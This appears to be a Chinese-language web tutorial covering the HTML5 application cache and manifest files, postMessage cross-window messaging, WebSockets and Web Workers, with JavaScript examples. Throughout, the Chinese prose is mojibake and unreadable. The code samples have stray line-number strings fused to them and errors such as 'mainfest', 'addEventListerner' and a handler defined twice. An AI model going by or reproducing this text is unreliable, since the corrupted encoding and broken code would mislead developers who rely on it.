å¼•å…¥äº†åº”ç”¨ç¨‹åºç¼“å­˜ï¼Œè¿™æ„å‘³ç€ web åº”ç”¨å¯è¿›è¡Œç¼“å­˜ï¼Œå¹¶å¯åœ¨æ²¡æœ‰å› ç‰¹ç½‘è¿žæŽ¥æ—¶è¿›è¡Œè®¿é—®ã€‚ åº”ç”¨ç¨‹åºç¼“å­˜ä¸ºåº”ç”¨å¸¦æ¥ä¸‰ä¸ªä¼˜åŠ¿ï¼š ç¦»çº¿æµè§ˆ - ç”¨æˆ·å¯åœ¨åº”ç”¨ç¦»çº¿æ—¶ä½¿ç”¨å®ƒä»¬ é€Ÿåº¦ - å·²ç¼“å­˜èµ„æºåŠ è½½å¾—æ›´å¿« å‡å°‘æœåŠ¡å™¨è´Ÿè½½ - æµè§ˆå™¨å°†åªä»ŽæœåŠ¡å™¨ä¸‹è½½æ›´æ–°è¿‡æˆ–æ›´æ”¹è¿‡çš„èµ„æºã€‚ æœ¬åœ°ç¼“å­˜ä¸Žæµè§ˆå™¨ç½‘é¡µç¼“å­˜çš„åŒºåˆ« æœ¬åœ°ç¼“å­˜ä¸ºæ•´ä¸ª Web ç¨‹åºæœåŠ¡çš„ï¼Œæµè§ˆå™¨çš„ç½‘é¡µç¼“å­˜åªæœåŠ¡äºŽå•ä¸ªç½‘é¡µã€‚ä»»ä½•ç½‘é¡µéƒ½æœ‰ç½‘é¡µç¼“å­˜ï¼Œè€Œæœ¬åœ°ç¼“å­˜å€¼ç¼“å­˜æŒ‡å®šçš„ç½‘é¡µã€‚æœ¬åœ°ç¼“å­˜å¯ä»¥æŽ§åˆ¶ç¼“å­˜æ›´æ–°ï¼Œåˆ©ç”¨ç¼“å­˜å¯¹è±¡çš„å„ç§å±žæ€§ã€çŠ¶æ€å’Œäº‹ä»¶æ¥å¼€å‘å‡ºç¦»çº¿åº”ç”¨ç¨‹åº manifestæ–‡ä»¶é¦–å…ˆåœ¨ index.html ä¸­å¼•å…¥ 123&lt;ï¼DOCTYPE html&gt;&lt;html mainfest ='index.appcache'&gt;&lt;/html&gt; æ¯ä¸ªæŒ‡å®šäº† manifest çš„é¡µé¢åœ¨ç”¨æˆ·å¯¹å…¶è®¿é—®æ—¶éƒ½ä¼šè¢«ç¼“å­˜ã€‚å¦‚æžœæœªæŒ‡å®š manifest å±žæ€§ï¼Œåˆ™é¡µé¢ä¸ä¼šè¢«ç¼“å­˜ï¼ˆé™¤éžåœ¨ manifest æ–‡ä»¶ä¸­ç›´æŽ¥æŒ‡å®šäº†è¯¥é¡µé¢ï¼‰ã€‚ manifest æ–‡ä»¶çš„å»ºè®®çš„æ–‡ä»¶æ‰©å±•åæ˜¯ï¼šâ€.appcacheâ€ã€‚ è¯·æ³¨æ„ï¼Œmanifest æ–‡ä»¶éœ€è¦é…ç½®æ­£ç¡®çš„ MIME-typeï¼Œå³ â€œtext/cache-manifestâ€ã€‚å¿…é¡»åœ¨ web æœåŠ¡å™¨ä¸Šè¿›è¡Œé…ç½®ã€‚ Web åº”ç”¨ç¨‹åºçš„æœ¬åœ°ç¼“å­˜æ˜¯é€šè¿‡æ¯ä¸ªé¡µé¢çš„ manifestæ–‡ä»¶æ¥ç®¡ç†çš„ã€‚æ˜¯ä¸€ä¸ªç®€å•çš„æ–‡ä»¶æ–‡æœ¬ï¼Œæ¸…å•åˆ—ä¸¾äº†éœ€è¦è¢«ç¼“å­˜æˆ–è€…ä¸éœ€è¦è¢«ç¼“å­˜çš„èµ„æºæ–‡ä»¶çš„æ–‡ä»¶åä»¥åŠè®¿é—®è·¯å¾„ã€‚ manifest æ–‡ä»¶å¯åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†ï¼š CACHE MANIFEST - åœ¨æ­¤æ ‡é¢˜ä¸‹åˆ—å‡ºçš„æ–‡ä»¶å°†åœ¨é¦–æ¬¡ä¸‹è½½åŽè¿›è¡Œç¼“å­˜ NETWORK - åœ¨æ­¤æ ‡é¢˜ä¸‹åˆ—å‡ºçš„æ–‡ä»¶éœ€è¦ä¸ŽæœåŠ¡å™¨çš„è¿žæŽ¥ï¼Œä¸”ä¸ä¼šè¢«ç¼“å­˜ FALLBACK - åœ¨æ­¤æ ‡é¢˜ä¸‹åˆ—å‡ºçš„æ–‡ä»¶è§„å®šå½“é¡µé¢æ— æ³•è®¿é—®æ—¶çš„å›žé€€é¡µé¢ï¼ˆæ¯”å¦‚ 404 é¡µé¢ï¼‰ 12345678910111213141516CACHE MANIFEST# æ–‡ä»¶å¼€å¤´å¿…é¡»è¦ä¹¦å†™ CACHE MANIFEST# ä»¥ä¸‹æ˜¯éœ€è¦ç¼“å­˜çš„æ–‡ä»¶other.htmlimages/1.jpgjs/jquery.jscss/bootstrap.cssNETWORKï¼šlogin.aspFALLBACK:online.js locale.js# å¦‚æžœæ— æ³•å»ºç«‹å› ç‰¹ç½‘è¿žæŽ¥ï¼Œç”¨ 404é¡µé¢æ›¿æ¢/html/ç›®å½•æ‰€æœ‰çš„æ–‡ä»¶ï¼Œç¬¬ä¸€ä¸ªæ˜¯ URIèµ„æºï¼Œç¬¬äºŒä¸ªæ˜¯æ›¿è¡¥/html5/ /404.html æ›´æ–°ç¼“å­˜ ä¸€æ—¦åº”ç”¨è¢«ç¼“å­˜ï¼Œå®ƒå°±ä¼šä¿æŒç¼“å­˜çŸ¥é“ä¸‹åˆ—çš„æƒ…å†µå‘ç”Ÿï¼š ç”¨æˆ·æ¸…ç©ºæµè§ˆå™¨ç¼“å­˜ manifest æ–‡ä»¶è¢«ä¿®æ”¹ ç”±ç¨‹åºæ¥æ›´æ–°åº”ç”¨ç¼“å­˜ æµè§ˆå™¨ä¸ŽæœåŠ¡å™¨çš„äº¤äº’è¿‡ç¨‹åœºæ™¯ï¼šè®¿é—® ç½‘ç«™A,ä»¥ index.html ä¸ºä¸»é¡µï¼Œä½¿ç”¨ manifest ç¼“å­˜äº† index.htmlã€1.jsã€1.cssã€1.jpgå‡ ä¸ªèµ„æºæ–‡ä»¶ã€‚ ç¬¬ä¸€æ¬¡è®¿é—®ï¼š æµè§ˆå™¨è¯·æ±‚è®¿é—®ç½‘ç«™ A æœåŠ¡å™¨è®¿é—® index.html æµè§ˆå™¨è§£æž index.htmlï¼Œè¯·æ±‚é¡µé¢ä¸Šçš„æ‰€æœ‰èµ„æºï¼ŒåŒ…æ‹¬ HTML/å›¾åƒæ–‡ä»¶/CSS/JS/manifestæ–‡ä»¶ç­‰ æœåŠ¡å™¨è¿”å›žæ‰€æœ‰èµ„æº æµè§ˆå™¨å¤„ç† manifestæ–‡ä»¶ï¼Œè¯·æ±‚ manifestæŒ‡å®šçš„æœ¬åœ°ç¼“å­˜çš„æ–‡ä»¶ï¼Œå³ä½¿3ä¸­å·²ç»è¯·æ±‚è¿‡äº†ã€‚å¦‚æžœè¦æ±‚ç¼“å­˜æ‰€æœ‰æ–‡ä»¶ä¹Ÿæ˜¯ä¸€ä¸ªæ¯”è¾ƒå¤§çš„é‡å¤è¿‡ç¨‹ã€‚ æœåŠ¡å™¨è¿”å›žæ‰€æœ‰è¦æ±‚ç¼“å­˜çš„æ–‡ä»¶ æµè§ˆå™¨å¯¹æœ¬åœ°ç¼“å­˜æ–‡ä»¶è¿›è¡Œç¼“å­˜ï¼Œè§¦å‘ä¸€ä¸ªäº‹ä»¶ï¼Œé€šçŸ¥æœ¬åœ°ç¼“å­˜è¢«æ›´æ–° manifestæ–‡ä»¶æ²¡æœ‰è¢«ä¿®æ”¹ï¼Œç¬¬äºŒæ¬¡è®¿é—®ï¼š æµè§ˆå™¨å†æ¬¡è¯·æ±‚ç½‘ç«™A æµè§ˆå™¨å‘çŽ°è¿™ä¸ªé¡µé¢è¢«æœ¬åœ°ç¼“å­˜ï¼ŒäºŽæ˜¯ä½¿ç”¨æœ¬åœ°ç¼“å­˜ä¸­çš„ index.htmlé¡µé¢ æµè§ˆå™¨è§£æž index.htmlï¼Œä½¿ç”¨æ‰€æœ‰æœ¬åœ°ç¼“å­˜ä¸­çš„èµ„æºæ–‡ä»¶ æµè§ˆå™¨å‘æœåŠ¡å™¨è¯·æ±‚ manifest æ–‡ä»¶ æœåŠ¡å™¨è¿”å›žä¸€ä¸ª 304ï¼Œé€šçŸ¥æµè§ˆå™¨ manifestæ²¡æœ‰å‘ç”Ÿå˜åŒ– manifestæ–‡ä»¶è¢«ä¿®æ”¹äº†ï¼Œç¬¬ä¸‰æ¬¡è®¿é—®ï¼š æµè§ˆå™¨å†æ¬¡è¯·æ±‚ç½‘ç«™A æµè§ˆå™¨å‘é€è¿™ä¸ªé¡µé¢è¢«æœ¬åœ°ç¼“å­˜äº†ï¼ŒäºŽæ˜¯ä½¿ç”¨æœ¬åœ°ç¼“å­˜ä¸­çš„ index.htmlé¡µé¢ æµè§ˆå™¨è§£æž index.html æ–‡ä»¶ï¼Œä½¿ç”¨æ‰€æœ‰æœ¬åœ°ç¼“å­˜ä¸­çš„èµ„æºæ–‡ä»¶ æµè§ˆå™¨å‘æœåŠ¡å™¨è¯·æ±‚ manifestæ–‡ä»¶ æœåŠ¡å™¨è¿”å›žæ›´æ–°è¿‡çš„ manifestæ–‡ä»¶ æµè§ˆå™¨å¤„ç† manifestæ–‡ä»¶ï¼Œå‘é€æ–‡ä»¶å·²ç»æ›´æ–°äº†ï¼ŒäºŽæ˜¯è¯·æ±‚æ‰€æœ‰è¦æ±‚è¿›è¡Œæœ¬åœ°ç¼“å­˜çš„èµ„æºæ–‡ä»¶ï¼ŒåŒ…æ‹¬ index.html æœ¬èº« æµè§ˆå™¨è¿”å›žè¦æ±‚è¿›è¡Œæœ¬åœ°ç¼“å­˜çš„èµ„æºæ–‡ä»¶ æµè§ˆå™¨å¯¹æœ¬åœ°ç¼“å­˜è¿›è¡Œæ›´æ–°ï¼Œå­˜å…¥æ‰€æœ‰æ–°çš„èµ„æºæ–‡ä»¶ï¼Œå¹¶ä¸”è§¦å‘ä¸€ä¸ªäº‹ä»¶ï¼Œé€šçŸ¥æœ¬åœ°ç¼“å­˜è¢«æ›´æ–°äº† æµè§ˆå™¨ç¼“å­˜è¿‡ç¨‹ä¸­ä¼šè§¦å‘ä¸€ç³»åˆ—äº‹ä»¶ï¼Œè¯¥äº‹ä»¶å¤„ç†ç¨‹åºæ³¨å†Œåœ¨ApplicationCacheå¯¹è±¡ä¸Šï¼Œæ­¤å¯¹è±¡æ˜¯windowçš„applicationCacheå±žæ€§çš„å€¼ã€‚ ä¸‹é¢è¯¦ç»†æè¿°äº†åŠ è½½æ–‡æ¡£ä¸Žæ›´æ–°åº”ç”¨ç¼“å­˜çš„æµç¨‹ï¼š å½“æµè§ˆå™¨è®¿é—®ä¸€ä¸ªåŒ…å« manifest ç‰¹æ€§çš„æ–‡æ¡£æ—¶ï¼Œå¦‚æžœåº”ç”¨ç¼“å­˜ä¸å­˜åœ¨ï¼Œæµè§ˆå™¨ä¼šåŠ è½½æ–‡æ¡£ï¼Œç„¶åŽèŽ·å–æ‰€æœ‰åœ¨æ¸…å•æ–‡ä»¶ä¸­åˆ—å‡ºçš„æ–‡ä»¶ï¼Œç”Ÿæˆåº”ç”¨ç¼“å­˜çš„ç¬¬ä¸€ä¸ªç‰ˆæœ¬ã€‚ å¯¹è¯¥æ–‡æ¡£çš„åŽç»­è®¿é—®ä¼šä½¿æµè§ˆå™¨ç›´æŽ¥ä»Žåº”ç”¨ç¼“å­˜(è€Œä¸æ˜¯æœåŠ¡å™¨)ä¸­åŠ è½½æ–‡æ¡£ä¸Žå…¶ä»–åœ¨æ¸…å•æ–‡ä»¶ä¸­åˆ—å‡ºçš„èµ„æºã€‚æ­¤å¤–ï¼Œæµè§ˆå™¨è¿˜ä¼šå‘ window.applicationCache å¯¹è±¡å‘é€ä¸€ä¸ª checking äº‹ä»¶ï¼Œåœ¨éµå¾ªåˆé€‚çš„ HTTP ç¼“å­˜è§„åˆ™å‰æä¸‹ï¼ŒèŽ·å–æ¸…å•æ–‡ä»¶ã€‚ å¦‚æžœå½“å‰ç¼“å­˜çš„æ¸…å•å‰¯æœ¬æ˜¯æœ€æ–°çš„ï¼Œæµè§ˆå™¨å°†å‘ applicationCache å¯¹è±¡å‘é€ä¸€ä¸ª noupdate äº‹ä»¶ï¼Œåˆ°æ­¤ï¼Œæ›´æ–°è¿‡ç¨‹ç»“æŸã€‚æ³¨æ„ï¼Œå¦‚æžœä½ åœ¨æœåŠ¡å™¨ä¿®æ”¹äº†ä»»ä½•ç¼“å­˜èµ„æºï¼ŒåŒæ—¶ä¹Ÿåº”è¯¥ä¿®æ”¹æ¸…å•æ–‡ä»¶ï¼Œè¿™æ ·æµè§ˆå™¨æ‰èƒ½çŸ¥é“å®ƒéœ€è¦é‡æ–°èŽ·å–èµ„æºã€‚ å¦‚æžœæ¸…å•æ–‡ä»¶å·²ç»æ”¹å˜ï¼Œæ–‡ä»¶ä¸­åˆ—å‡ºçš„æ‰€æœ‰æ–‡ä»¶â€”ä¹ŸåŒ…æ‹¬é€šè¿‡è°ƒç”¨ applicationCache.add() æ–¹æ³•æ·»åŠ åˆ°ç¼“å­˜ä¸­çš„é‚£äº›æ–‡ä»¶â€”ä¼šè¢«èŽ·å–å¹¶æ”¾åˆ°ä¸€ä¸ªä¸´æ—¶ç¼“å­˜ä¸­ï¼Œéµå¾ªé€‚å½“çš„ HTTP ç¼“å­˜è§„åˆ™ã€‚å¯¹äºŽæ¯ä¸ªåŠ å…¥åˆ°ä¸´æ—¶ç¼“å­˜ä¸­çš„æ–‡ä»¶ï¼Œæµè§ˆå™¨ä¼šå‘ applicationCache å¯¹è±¡å‘é€ä¸€ä¸ª progress äº‹ä»¶ã€‚å¦‚æžœå‡ºçŽ°ä»»ä½•é”™è¯¯ï¼Œæµè§ˆå™¨ä¼šå‘é€ä¸€ä¸ª error äº‹ä»¶ï¼Œå¹¶æš‚åœæ›´æ–°ã€‚ ä¸€æ—¦æ‰€æœ‰æ–‡ä»¶éƒ½èŽ·å–æˆåŠŸï¼Œå®ƒä»¬ä¼šè‡ªåŠ¨ç§»é€åˆ°çœŸæ­£çš„ç¦»çº¿ç¼“å­˜ä¸­ï¼Œå¹¶å‘ applicationCacheå¯¹è±¡å‘é€ä¸€ä¸ª cached äº‹ä»¶ã€‚é‰´äºŽæ–‡æ¡£æ—©å·²ç»è¢«ä»Žç¼“å­˜åŠ è½½åˆ°æµè§ˆå™¨ä¸­ï¼Œæ‰€ä»¥æ›´æ–°åŽçš„æ–‡æ¡£ä¸ä¼šé‡æ–°æ¸²æŸ“ï¼Œç›´åˆ°é¡µé¢é‡æ–°åŠ è½½(å¯ä»¥æ‰‹åŠ¨æˆ–é€šè¿‡ç¨‹åº). 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556//è½½å…¥çš„æ—¶å€™ï¼Œæ£€æŸ¥è¯¥æ¸…å•æ–‡ä»¶ã€‚window.applicationCache.onchecking = function()&#123; $("san").innerHTML = "checking for a new version"; return false;&#125;//å¦‚æžœæ¸…å•æ–‡ä»¶æ²¡æœ‰åŠ¨ï¼ŒåŒæ—¶åº”ç”¨ç¨‹åºä¹Ÿå·²ç»ç¼“å­˜äº†ï¼Œè¯¥äº‹ä»¶æ‰§è¡Œã€‚window.applicationCache.onnoupdate = function()&#123; $("san").innerHTML = "This version is up-to-date"; return false;&#125;//å¦‚æžœè¿˜æœªç¼“å­˜åº”ç”¨ç¨‹åºï¼Œæˆ–è€…æ¸…å•æœ‰æ”¹åŠ¨window.applicationCache.ondownloading = function()&#123; $("san").innerHTML = "Downloading new version"; window.progresscount = 0; //åœ¨ä¸‹é¢çš„äº‹ä»¶ä¸­ç”¨åˆ° return false;&#125;//ä¸‹è½½è¿‡ç¨‹ä¸æ–­è°ƒç”¨progressäº‹ä»¶ï¼Œé€šå¸¸åœ¨æ¯ä¸ªæ–‡ä»¶ä¸‹è½½å®Œçš„æ—¶å€™ã€‚window.applicationCache.onprogress = function(e)&#123; var progress = ""; if(e &amp;&amp; e.lengthComputable)&#123; progress = "" + Math.round(100*e.loaded / e.total) + "%"; //è®¡ç®—ä¸‹è½½å®Œæˆæ¯”ä¾‹ &#125; else&#123; progress = "(" + ++progresscount + ")"; //è¾“å‡ºè°ƒç”¨æ¬¡æ•°ã€‚ &#125; $("san").innerHTML = "Downloading new version" + progress; return false;&#125;//å½“ä¸‹è½½å®Œæˆå¹¶ä¸”é¦–æ¬¡å°†åº”ç”¨ç¨‹åºä¸‹è½½åˆ°ç¼“å­˜ä¸­æ—¶window.applicationCache.oncached = function()&#123; $("san").innerHTML = "This application is now cached locally" ; return false;&#125;//ä¸‹è½½å®Œæˆå¹¶ä¸”é¦–æ¬¡å°†åº”ç”¨ç¨‹åºä¸‹è½½åˆ°ç¼“å­˜ä¸­ã€‚window.applicationCache.oncached = function() &#123; status("This application is now cached locally"); return false;&#125;;//ä¸‹è½½å®Œæˆå¹¶ç¼“å­˜çš„ç¨‹åºæ›´æ–°åŽè§¦å‘ï¼Œæ³¨æ„è§¦å‘æ­¤äº‹ä»¶æ—¶ï¼Œç”¨æˆ·ä»»ç„¶çœ‹åˆ°è€ç‰ˆæœ¬ï¼Œåªæœ‰å½“ç”¨æˆ·å†æ¬¡è½½å…¥æ—¶æ‰ä¼šè®¿é—®æœ€æ–°ç‰ˆã€‚window.applicationCache.onupdateready = function() &#123; status("A new version has been downloaded. Reload to run it"); return false;&#125;;//å¤„äºŽç¦»çº¿æ—¶ï¼Œæ£€æŸ¥æ¸…å•å¤±è´¥è§¦å‘ã€‚ window.applicationCache.onerror = function() &#123; status("Couldn't load manifest or cache application"); return false;&#125;; //ç¨‹åºå¼•ç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„æ¸…å•æ–‡ä»¶è§¦å‘ï¼ŒåŒæ—¶å°†åº”ç”¨ä»Žç¼“å­˜ä¸­åˆ é™¤ã€‚window.applicationCache.onobsolete = function() &#123; status("This application is no longer cached. " + "Reload to get the latest version from the network."); return false;&#125;; é€šä¿¡ APIè·¨æ–‡æ¡£æ¶ˆæ¯ä¼ è¾“å¯ä»¥åœ¨ä¸åŒç½‘é¡µæ–‡æ¡£ã€ä¸åŒç«¯å£ã€ä¸åŒåŸŸä¹‹é—´è¿›è¡Œæ¶ˆæ¯ä¼ é€’ã€‚ HTML5 æä¾›äº†åœ¨ç½‘é¡µæ–‡æ¡£ä¹‹é—´äº’ç›¸æŽ¥å—ä¸Žå‘é€æ¶ˆæ¯çš„åŠŸèƒ½ï¼Œåªè¦èŽ·å–åˆ°ç½‘é¡µæ‰€åœ¨çª—å£å¯¹è±¡çš„å®žä¾‹ï¼Œä¸ä»…åŒæºï¼ˆåŸŸ+ç«¯å£å·ï¼‰çš„ Web ä¹‹é—´å¯ä»¥äº’ç›¸é€šä¿¡ï¼Œç”šè‡³å¯ä»¥å®žçŽ°è·¨åŸŸé€šä¿¡ã€‚ 12345678910window.postMessage();// è¿™ä¸ªæ–¹æ³•å¯ä»¥å®‰å…¨å®žçŽ°è·¨åŸŸé€šä¿¡ã€‚æä¾›äº†ä¸€ä¸ªå—æŽ§ç¦æ­¢æ¥è§„é¿åŒæºç­–ç•¥çš„é™åˆ¶ã€‚è¿™ä¸ªæ–¹æ³•è¢«è°ƒç”¨æ—¶ï¼Œä¼šåœ¨æ‰€æœ‰é¡µé¢è„šæœ¬æ‰§è¡Œå®Œæ¯•ä¹‹åŽå‘ç›®æ ‡çª—å£æ´¾å‘ä¸€ä¸ª MessageEvent æ¶ˆæ¯ã€‚è¿™ä¸ªæ¶ˆæ¯æœ‰å››ä¸ªå±žæ€§ï¼šmessageå±žæ€§è¡¨ç¤º messageç±»åž‹ï¼Œdataå±žæ€§ä¸º window.postMessageçš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼›originå±žæ€§è¡¨ç¤ºè°ƒç”¨ window.postMessageæ–¹æ³•è°ƒç”¨é¡µé¢çš„å½“å‰çŠ¶æ€ï¼›sourceå±žæ€§è®°å½•è°ƒç”¨ window.postMessageæ–¹æ³•çš„çª—å£æ¶ˆæ¯otherWindow.postMessage(message,targetOrigin,[transfer]);/*** otherWindow å…¶ä»–çª—å£çš„ä¸€ä¸ªå¼•ç”¨ï¼Œæ¯”å¦‚ iframeçš„contentWindowå±žæ€§ï¼Œæ‰§è¡Œ window.openè¿”å›žçš„çª—å£å¯¹è±¡ï¼Œæˆ–è€…æ˜¯å‘½åè¿‡æˆ–æ•°å€¼ç´¢å¼•çš„ window.frames* message å°†è¦å‘é€åˆ°å…¶ä»– windowçš„æ•°æ®ï¼Œä¼šè¢«ç»“æž„åŒ–å…‹éš†ç®—æ³•åºåˆ—åŒ–ã€‚æ„å‘³ç€ä¸å—ä»€ä¹ˆé™åˆ¶å°†æ•°æ®å¯¹è±¡å®‰å…¨ä¼ é€ç»™ç›®æ ‡çª—å£ä¸ç”¨è‡ªå·±åºåˆ—åŒ–* targetOrigin é€šè¿‡çª—å£çš„ origin å±žæ€§æ¥æŒ‡å®šå“ªäº›çª—å£èƒ½æŽ¥å—åˆ°æ¶ˆæ¯æ—¶é—´ã€‚å¯ä»¥æ˜¯â€œ*â€æˆ–è€…ä¸€ä¸ªURI.å¦‚æžœç›®æ ‡çª—å£çš„åè®®ã€ä¸»æœºåœ°å€æˆ–ç«¯å£è¿™ä¸‰è€…çš„ä»»æ„ä¸€é¡¹ä¸åŒ¹é…targetOriginæä¾›çš„å€¼ï¼Œé‚£ä¹ˆæ¶ˆæ¯å°±ä¸ä¼šè¢«å‘é€ï¼›åªæœ‰ä¸‰è€…å®Œå…¨åŒ¹é…ï¼Œæ¶ˆæ¯æ‰ä¼šè¢«å‘é€ã€‚è¿™ä¸ªæœºåˆ¶ç”¨æ¥æŽ§åˆ¶æ¶ˆæ¯å¯ä»¥å‘é€åˆ°å“ªäº›çª—å£ï¼›* transfer å¯é€‰ æ˜¯ä¸€ä¸²å’Œ messageåŒæ—¶ä¼ é€’çš„ Transferable å¯¹è±¡ï¼Œè¿™äº›å¯¹è±¡çš„æ‰€æœ‰æƒå°†è¢«è½¬ç§»ç»™æ¶ˆæ¯çš„æŽ¥æ”¶æ–¹ï¼Œè€Œå‘é€ä¸€æ–¹ä¸å†ä¿æœ‰æ‰€æœ‰æƒã€‚*/ æ´¾å‘äº‹ä»¶ 12345678910111213window.addEventListener('message',receiveMessage,false);function receiveMessage(event)&#123; let &#123; origin,data,source&#125; = event; if(origin !== 'http://example.com:8080') return; console.log(source+':'+data);&#125;/*** messageçš„å±žæ€§;* data ä»Žå…¶ä»– window ä¼ é€’æ¥çš„å¯¹è±¡* origin è°ƒç”¨ postMessage æ—¶æ¶ˆæ¯å‘é€æ–¹çª—å£çš„ originï¼Œä¸èƒ½ä¿è¯æ˜¯è¯¥çª—å£å½“å‰çš„ æˆ–è€… æœªæ¥çš„originï¼Œå› ä¸º postMessageè¢«è°ƒç”¨åŽå¯èƒ½è¢«å¯¼èˆªåˆ°ä¸åŒçš„ä½ç½®* source å¯¹å‘é€æ¶ˆæ¯çª—å£çš„å¼•ç”¨ï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸ªåœ¨å…·æœ‰ä¸åŒ origin çš„ä¸¤ä¸ªçª—å£å»ºç«‹åŒå‘é€šä¿¡*/ ç¤ºä¾‹ 12345678910111213// Açª—å£åŸŸåæ˜¯ http://example.com:8080 ä¸‹é¢æ˜¯ A çª—å£ script é‡Œé¢ä»£ç let popup = window.open(...popup details...);// å¦‚æžœå¼¹å‡ºæ¡†æ²¡æœ‰è¢«é˜»æ­¢ä¸”åŠ è½½å®Œæˆ// è¿™è¡Œè¯­å¥æ²¡æœ‰å‘é€ä¿¡æ¯å‡ºåŽ»ï¼Œå³ä½¿å‡è®¾å½“å‰é¡µé¢æ²¡æœ‰æ”¹å˜locationï¼ˆå› ä¸ºtargetOriginè®¾ç½®ä¸å¯¹ï¼‰popup.postMessage("The user is 'bob' and the password is 'secret'","https://secure.example.net");// å‡è®¾å½“å‰é¡µé¢æ²¡æœ‰æ”¹å˜locationï¼Œè¿™æ¡è¯­å¥ä¼šæˆåŠŸæ·»åŠ messageåˆ°å‘é€é˜Ÿåˆ—ä¸­åŽ»ï¼ˆtargetOriginè®¾ç½®å¯¹äº†ï¼‰popup.postMessage("hello there!","http://example.com");function receiveMessage(event)&#123; if(event.origin !== 'http://example.org') return&#125;window.addEventListener('message',receiveMessage,false); 12345678910// å¼¹å‡ºé¡µ popupåŸŸåæ˜¯ http://example.org ä¸‹é¢æ˜¯ script é‡Œé¢ä»£ç //å½“Aé¡µé¢postMessageè¢«è°ƒç”¨åŽï¼Œè¿™ä¸ªfunctionè¢«addEventListennerè°ƒç”¨function receiveMessage(event)&#123; if(event.origin !== 'http://example.com:8080') return // event.data æ˜¯ "hello there!" // event.source å°±å½“å‰å¼¹å‡ºé¡µçš„æ¥æºé¡µé¢ event.source.postMessage("hi there yourself! the secret response " +"is: rheeeeet!",event.origin);&#125;window.addEventListener("message", receiveMessage, false); Web Sockets é€šä¿¡ä½¿ç”¨ Web Sockets API å¯ä»¥åœ¨æœåŠ¡å™¨ä¸Žå®¢æˆ·ç«¯ä¹‹é—´å»ºç«‹ä¸€ä¸ªéž HTTP çš„åŒå‘è¿žæŽ¥ã€‚è¿™ä¸ªè¿žæŽ¥æ˜¯å®žæ—¶çš„ï¼Œä¹Ÿæ˜¯è¦æ°¸ä¹…çš„ï¼Œé™¤éžæŸä¸€æ–¹æ˜¾ç¤ºå…³é—­ã€‚ å¸¸é‡ Constant Value WebSocket.CONNECTING 0 WebSocket.OPEN 1 WebSocket.CLOSING 2 WebSocket.CLOSED 3 ä»¥ä¸Šæ˜¯WebSocket æž„é€ å‡½æ•°çš„åŽŸåž‹ä¸­å­˜åœ¨çš„ä¸€äº›å¸¸é‡ï¼Œå¯é€šè¿‡ WebSocket.readyState å¯¹ç…§ä¸Šè¿°å¸¸é‡åˆ¤æ–­ WebSocket è¿žæŽ¥ å½“å‰æ‰€å¤„çš„çŠ¶æ€ ç”¨æ³•ï¼š 1234567891011121314151617181920212223242526// URLå­—ç¬¦ä¸²ä»¥ ws æˆ–è€… wssï¼ˆåŠ å¯†é€šä¿¡æ—¶ï¼‰æ–‡å­—å¼€å¤´const socket = new WebSocket('ws://localhost:8080');socket.addEventListener('open',function(event)&#123; // sendæ–¹æ³•å¯¹æœåŠ¡å™¨å‘é€æ•°æ®ï¼Œåªèƒ½å‘é€æ–‡æœ¬æ•°æ®ï¼Œå¯ä»¥ä½¿ç”¨ JSONå¯¹è±¡æŠŠä»»ä½• jså¯¹è±¡è½¬æ¢ä¸ºæ–‡æœ¬æ•°æ®åŽå‘é€ socket.send('Hello Server!');&#125;);socket.addEventListerner('message',function(event)&#123; console.log('Message from server',event.data);&#125;);//äº‹ä»¶å¥æŸ„// æŽ¥å—æœåŠ¡å™¨ä¼ è¿‡æ¥çš„æ•°æ®socket.onmessage = function(event)&#123; let &#123; data &#125; = event&#125;socket.onopen = function(event)&#123; // å¼€å§‹é€šä¿¡&#125;// ç›‘å¬ socket å…³é—­äº‹ä»¶socket.onclose = function(event)&#123; // é€šä¿¡ç»“æŸæ—¶çš„å¤„ç†&#125;// å…³é—­ socketï¼Œåˆ‡æ–­é€šä¿¡è¿žæŽ¥0000socket.close() ä½¿ç”¨ Web Workers å¤„ç†çº¿ç¨‹web worker æ˜¯è¿è¡Œåœ¨åŽå°çš„ javaScriptï¼Œä¸ä¼šå½±å“é¡µé¢çš„æ€§èƒ½ã€‚ åˆ›å»ºåŽå°çº¿ç¨‹çš„æ­¥éª¤å¾ˆç®€å•ã€‚å°†éœ€è¦åœ¨åŽå°çº¿ç¨‹ä¸­æŒ‡å®šçš„è„šæœ¬æ–‡ä»¶çš„ URL åœ°å€ä½œä¸ºå‚æ•°ï¼Œç„¶åŽåˆ›å»º Workerå¯¹è±¡å°±å¯ä»¥äº† 12let worker = new Worker('worker.js');// åŽå°çº¿ç¨‹æ˜¯ä¸èƒ½è®¿é—®åˆ°é¡µé¢æˆ–è€…çª—å£å¯¹è±¡çš„ï¼Œæ‰€ä»¥å¦‚æžœä½¿ç”¨åˆ° windowå¯¹è±¡æˆ–è€… documentå¯¹è±¡ä¼šä»¥å‰ä½ é”™è¯¯çš„å‘ç”Ÿ å¯ä»¥é€šè¿‡å‘é€å’ŒæŽ¥æ”¶æ¶ˆæ¯æ¥ä¸ŽåŽå°çº¿ç¨‹äº’ç›¸ä¼ é€’æ•°æ®ã€‚é€šè¿‡ Worker å¯¹è±¡çš„ onmessage äº‹ä»¶å¥æŸ„æ´»æœŸæˆ·åŽå°çº¿ç¨‹ä¹‹é—´çš„æ¶ˆæ¯ 12345worker.onmessage = function(event)&#123; // å¤„ç†æ”¶åˆ°çš„æ¶ˆæ¯&#125;// message æ–‡æœ¬æ•°æ®worker.postMessage(message); ç¤ºä¾‹ï¼šæ±‚å’Œè®¡ç®—12345678910111213141516&lt;body&gt; &lt;h1&gt;ä»Ž1åˆ°ç»™å®šæ•°å€¼æ±‚å’Œ&lt;/h1&gt; è¾“å…¥æ•°å€¼ï¼š&lt;input type="text" id="num"&gt; &lt;button onclick="calculate()"&gt;è®¡ç®—&lt;/button&gt; &lt;script&gt; let worker = new Worker('SumCalculate.js'); worker.onmessage = function(event)&#123; console.log(event.data); &#125; function calculate()&#123; let num = parseInt(document.getElementById('num').value,10); worker.postMessage(num); &#125; &lt;/script&gt;&lt;/body&gt; 123456789// SumCalculate.jsonmessage = function (event) &#123; let num = event.data; let result = 0; for (let i = 0; i &lt;= num; i++) &#123; result += i; &#125; postMessage(result);&#125; 